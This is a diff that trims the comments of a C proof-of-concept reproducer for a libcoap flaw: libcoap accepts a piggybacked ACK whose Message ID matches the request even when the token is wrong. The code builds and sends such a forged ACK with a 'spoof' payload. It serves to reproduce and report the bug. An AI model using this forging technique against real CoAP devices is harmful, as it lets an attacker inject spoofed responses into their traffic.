@@ -1,14 +1,4 @@
-/* libcoap matches a piggybacked ACK to its request by Message ID alone and does
- * not check the token. RFC 7252 5.3.2 requires both the Message ID and the
- * token to match. A forged ACK reusing the request's Message ID but carrying a
- * different token is delivered to the application as a matched response.
- *
- * build:
- *   cc token-spoof-repro.c -I<libcoap>/include \
- *      <libcoap>/.libs/libcoap-3-notls.a -o repro
- * run:
- *   ./repro            (exit 0 = reproduced)
- */
+/* libcoap matches a piggybacked ACK by Message ID alone; a wrong-token ACK is accepted (RFC 7252 5.3.2). */
 #define _DEFAULT_SOURCE
 #include <arpa/inet.h>
 #include <coap3/coap.h>
@@ -19,8 +9,7 @@
 
 #define PORT 5685
 
-/* Reply to the client's request with an ACK that reuses its Message ID
- * (bytes 2-3) but carries a different token. */
+/* Reply with an ACK reusing the request's Message ID but a different token. */
 static void forger(void) {
   int fd = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -35,10 +24,10 @@ static void forger(void) {
   socklen_t len = sizeof(cli);
   recvfrom(fd, in, sizeof(in), 0, (struct sockaddr *)&cli, &len);
 
-  uint8_t ack[] = {0x64,         /* ver 1, type ACK, TKL 4 */
+  uint8_t ack[] = {0x64,         /* ver 1, ACK, TKL 4 */
                    0x45,         /* 2.05 Content */
-                   in[2], in[3], /* Message ID copied from the request */
-                   0x23,     0,     0,   0, /* token (request used DE AD BE EF) */
+                   in[2], in[3], /* request's Message ID */
+                   0x23,     0,     0,   0, /* wrong token */
                    0xFF,  's',   'p', 'o', 'o', 'f'};
   sendto(fd, ack, sizeof(ack), 0, (struct sockaddr *)&cli, len);
   close(fd);
@@ -73,7 +62,7 @@ int main(void) {
     _exit(0);
   }
 
-  usleep(200 * 1000); /* let the forger bind before the client sends */
+  usleep(200 * 1000); /* let the forger bind first */
 
   coap_startup();
   printf("%s\n", coap_package_version());
